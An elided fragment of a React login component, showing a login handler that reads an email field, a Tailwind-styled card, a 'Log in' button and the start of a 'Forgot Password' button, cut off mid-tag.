...
export default function Login() {
  ...
  const handleLogin = async () => {
    const email = document.querySelector("input[placeholder='Phone number, user name, or email address']").value;
    ...
    <div className="min-h-screen bg-gray-100 relative">
      ...
      <div className="relative z-10 flex items-center justify-center min-h-screen px-4">
        <div className="bg-white p-8 rounded-xl shadow-2xl w-full max-w-md">
          ...
          {/* Login Button */}
          <button className="mt-6 w-full bg-red-600 text-white py-2 rounded-full hover:bg-red-700 transition"
          onClick={handleLogin}
          >
            Log in
          </button>
          ...
          {/* Forgot Password */}
          <button className="mt-6 w-full text-black py-2"
